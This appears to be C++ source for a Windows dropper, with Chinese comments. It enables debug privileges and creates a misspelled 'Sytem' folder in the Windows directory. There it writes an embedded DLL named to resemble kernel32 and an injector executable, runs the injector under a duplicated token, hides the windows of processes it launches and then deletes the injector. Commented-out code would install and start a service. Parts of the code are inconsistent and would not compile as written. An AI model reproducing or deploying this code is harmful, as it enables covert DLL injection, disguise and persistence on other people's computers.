#include <Windows.h>
#include <stdio.h>
#include <string>
#include "resource.h"
#include <string>
#include <UserEnv.h>
#include <WtsApi32.h>
#pragma comment(lib, "UserEnv.lib")
#pragma comment(lib, "WtsApi32.lib")

#include "../../ProcessManger/ProcessIterator/CProcessOpt.h"

using namespace std;
#ifdef  UNICODE
#define  STRING wstring
#else
#define  STRING string;
#endif //  UNICODE

BOOL WriteFile64AnCreateProcess(DWORD Type, STRING StartUpFileName);
BOOL WriteFile86AnCreateProcess(DWORD Type, STRING StartUpFileName);


BOOL ReleaseFile(DWORD Type);
BOOL NoSeccionCreateProcess(CBinString lpszFileName)
{
    BOOL bRet = TRUE;
    DWORD dwSessionID = 0;
    HANDLE hToken = NULL;
    HANDLE hDuplicatedToken = NULL;
    LPVOID lpEnvironment = NULL;
    STARTUPINFO si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(si);
    HANDLE ProcessHandle;
    HANDLE CurrentToken;

    ProcessHandle = GetCurrentProcess();
    if (!OpenProcessToken(ProcessHandle, TOKEN_ALL_ACCESS, &CurrentToken))
    {
        int d = GetLastError();
        OutputDebugStringA("OpenProcessToken ERROR");

        return 0;
    }

    do
    {
        // 获得当前Session ID
        dwSessionID = ::WTSGetActiveConsoleSessionId();

        // 获得当前Session的用户令牌
    /*    if (FALSE == ::WTSQueryUserToken(dwSessionID, &hToken))
        {
            OutputDebugStringA("WTSQueryUserToken ERROR");
            bRet = FALSE;
            break;
        }*/

        // 复制令牌
        hToken = CurrentToken;
        if (FALSE == ::DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL,
            SecurityIdentification, TokenPrimary, &hDuplicatedToken))
        {
            OutputDebugStringA("DuplicateTokenEx ERROR");

         
            bRet = FALSE;
            break;
        }

        // 创建用户Session环境
        if (FALSE == ::CreateEnvironmentBlock(&lpEnvironment,
            hDuplicatedToken, FALSE))
        {
            OutputDebugStringA("CreateEnvironmentBlock ERROR");

            bRet = FALSE;
            break;
        }

        // 在复制的用户Session下执行应用程序，创建进程
        if (FALSE == ::CreateProcessAsUser(hDuplicatedToken,
            lpszFileName.c_str(), NULL, NULL, NULL, FALSE,
            NORMAL_PRIORITY_CLASS | CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT,
            lpEnvironment, NULL, &si, &pi))
        {
            OutputDebugStringA("CreateProcessAsUser ERROR");

            bRet = FALSE;
            break;
        }

    } while (FALSE);
    // 关闭句柄, 释放资源
    if (lpEnvironment)
    {
        ::DestroyEnvironmentBlock(lpEnvironment);
    }
    if (hDuplicatedToken)
    {
        ::CloseHandle(hDuplicatedToken);
    }
    if (hToken)
    {
        ::CloseHandle(hToken);
    }
    return bRet;
}

BOOL WriteFile64AnCreateProcess(DWORD Type)
{
    HRSRC hrc = NULL;
    DWORD dwResourceSzie = 0;
    HGLOBAL hGlobalResource = NULL;
    hrc = FindResource(GetModuleHandle(NULL), MAKEINTRESOURCE(Type), TEXT("BIN"));
    if (NULL == hrc)
        return 0;
    dwResourceSzie = SizeofResource(GetModuleHandle(NULL), hrc);



    hGlobalResource = LoadResource(GetModuleHandle(NULL), hrc);
    if (NULL == hGlobalResource || dwResourceSzie <= 0)
        return 0;

    LPBYTE pData = (LPBYTE)LockResource(hGlobalResource);

    TCHAR SaveTempPath[MAX_PATH * sizeof(TCHAR)] = { NULL };
    GetSystemWindowsDirectory(SaveTempPath, MAX_PATH);

#ifdef UNICODE
    wstring TempFileName = SaveTempPath;
    TempFileName.append(TEXT("Protect.dat64"));
    FILE* pFile = NULL;
    _wfopen_s(&pFile, TempFileName.c_str(), TEXT("wb+"));
    //写入到文件
    if (NULL == pFile)
        return FALSE;

    fwrite(pData, sizeof(char), dwResourceSzie, pFile);//写入到文件

    fclose(pFile);
    FreeResource(hGlobalResource);
#else
    string TempFileName = SaveTempPath;
    TempFileName.append(TEXT("Protect.dat64"));
    FILE* pFile = NULL;
    fopen_s(&pFile, TempFileName.c_str(), "wb+");
    //写入到文件
    if (NULL == pFile)
        return FALSE;

    fwrite(pData, sizeof(char), dwResourceSzie, pFile);//写入到文件

    fclose(pFile);
    FreeResource(hGlobalResource);
#endif // UNICODE

    STARTUPINFO si;
    ZeroMemory(&si, sizeof(STARTUPINFO));
    si.cb = sizeof(STARTUPINFO);
    PROCESS_INFORMATION pi;

    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    BOOL bRet = CreateProcess(TempFileName.c_str(), NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return TRUE;
}
BOOL WriteFile86AnCreateProcess(DWORD Type,STRING StartUpFileName)
{
    HRSRC hrc = NULL;
    DWORD dwResourceSzie = 0;
    HGLOBAL hGlobalResource = NULL;
    hrc = FindResource(GetModuleHandle(NULL), MAKEINTRESOURCE(Type), TEXT("BIN"));
    if (NULL == hrc)
        return 0;
    dwResourceSzie = SizeofResource(GetModuleHandle(NULL), hrc);



    hGlobalResource = LoadResource(GetModuleHandle(NULL), hrc);
    if (NULL == hGlobalResource || dwResourceSzie <= 0)
        return 0;

    LPBYTE pData = (LPBYTE)LockResource(hGlobalResource);

#ifdef UNICODE
    
    FILE* pFile = NULL;
    _wfopen_s(&pFile, StartUpFileName.c_str(), TEXT("wb+"));
    //写入到文件
    if (NULL == pFile)
        return FALSE;

    fwrite(pData, sizeof(char), dwResourceSzie, pFile);//写入到文件

    fclose(pFile);
    FreeResource(hGlobalResource);
#else
    string TempFileName = SaveTempPath;
    TempFileName.append(TEXT("Protect.dat86"));
    FILE* pFile = NULL;
    fopen_s(&pFile, TempFileName.c_str(), "wb+");
    //写入到文件
    if (NULL == pFile)
        return FALSE;

    fwrite(pData, sizeof(char), dwResourceSzie, pFile);//写入到文件

    fclose(pFile);
    FreeResource(hGlobalResource);
#endif // UNICODE

    STARTUPINFO si;
    ZeroMemory(&si, sizeof(STARTUPINFO));
    si.cb = sizeof(STARTUPINFO);
    PROCESS_INFORMATION pi;

    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    BOOL bRet = CreateProcess(StartUpFileName.c_str(), NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);


   
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return TRUE;
}

BOOL ReleaseFile(DWORD Type,STRING fileName)
{
    HRSRC hrc = NULL;
    DWORD dwResourceSzie = 0;
    HGLOBAL hGlobalResource = NULL;
    hrc = FindResource(GetModuleHandle(NULL), MAKEINTRESOURCE(Type), TEXT("BIN"));
    if (NULL == hrc)
        return 0;
    dwResourceSzie = SizeofResource(GetModuleHandle(NULL), hrc);



    hGlobalResource = LoadResource(GetModuleHandle(NULL), hrc);
    if (NULL == hGlobalResource || dwResourceSzie <= 0)
        return 0;

    LPBYTE pData = (LPBYTE)LockResource(hGlobalResource);

#ifdef UNICODE

 // UNICODE

    FILE* pFile = NULL;
    _wfopen_s(&pFile, fileName.c_str(), TEXT("wb+"));
    //写入到文件
    if (NULL == pFile)
        return FALSE;

    fwrite(pData, sizeof(char), dwResourceSzie, pFile);//写入到文件

    fclose(pFile);
    FreeResource(hGlobalResource);
#else
    string TempFileName = SaveTempPath;
    TempFileName.append(fileName);
    FILE* pFile = NULL;
    fopen_s(&pFile, TempFileName.c_str(), "wb+");
    //写入到文件
    if (NULL == pFile)
        return FALSE;

    fwrite(pData, sizeof(char), dwResourceSzie, pFile);//写入到文件

    fclose(pFile);
    FreeResource(hGlobalResource);
#endif // UNICODE
    return TRUE;
}
STRING GetPath()
{
    TCHAR SaveTempPath[MAX_PATH * sizeof(TCHAR)] = { NULL };
    GetSystemWindowsDirectory(SaveTempPath, MAX_PATH);
    STRING FileName = SaveTempPath;
    
#ifdef UNICODE
    FileName.append(TEXT("\\"));
    FileName.append(TEXT("Sytem"));
    wstring TempFileName = TEXT("");
    if (NULL != CreateDirectory(FileName.c_str(), NULL))
    {
        TempFileName = FileName;
        TempFileName.append(TEXT("\\"));
        return STRING(TempFileName);
    }
    DWORD dwError = GetLastError();
    if (dwError == ERROR_ALREADY_EXISTS)
    {
         TempFileName = FileName;
        TempFileName.append(TEXT("\\"));
        return STRING(TempFileName);
    }
    return NULL;
    
#else
    FileName.append("\\");
    FileName.append("Sytem");
    string TempFileName = "";
    if (NULL != CreateDirectory(FileName.c_str(), NULL))
    {
        TempFileName = FileName;
        TempFileName.append("\\");
        return STRING(TempFileName);
    }
    DWORD dwError = GetLastError();
    if (dwError == ERROR_ALREADY_EXISTS)
    {
        TempFileName = FileName;
        TempFileName.append("\\");
        return STRING(TempFileName);
    }
    return NULL;
#endif
    
}
int main()
{
    CProcessOpt PsOpt;
    PsOpt.SeEnbalAdjustPrivileges(SE_DEBUG_NAME);


 
    CBinString patchName = TEXT("");
    patchName = GetPath();
    patchName.append(TEXT("kernel32l.dll"));//寫入DLL
    ReleaseFile(KILL_LOCKDLL, patchName);
    
  

    Sleep(1000);
    patchName = GetPath();
    patchName.append(TEXT("i.exe"));
    //WriteFile86AnCreateProcess(INJECT_KILL_IELOCKLOADER, patchName); //写注入器
    ReleaseFile(INJECT_KILL_IELOCKLOADER, patchName);
    NoSeccionCreateProcess(patchName);
 
    //写入SystemService

    //写入CreateService
    //patchName = GetPath();
    //patchName.append(TEXT("SystemServices.exe"));
    //ReleaseFile(SystemServices, patchName); //SystemService
    //Sleep(1000);//刪除文件.

    //patchName = GetPath();
    //patchName.append(TEXT("start"));
    //WriteFile86AnCreateProcess(CreateAnStartServices, patchName); //写注入器
    ////写入服务创建并且启动

    Sleep(3000);
    
    DeleteFile(patchName.c_str());

    return 0;
}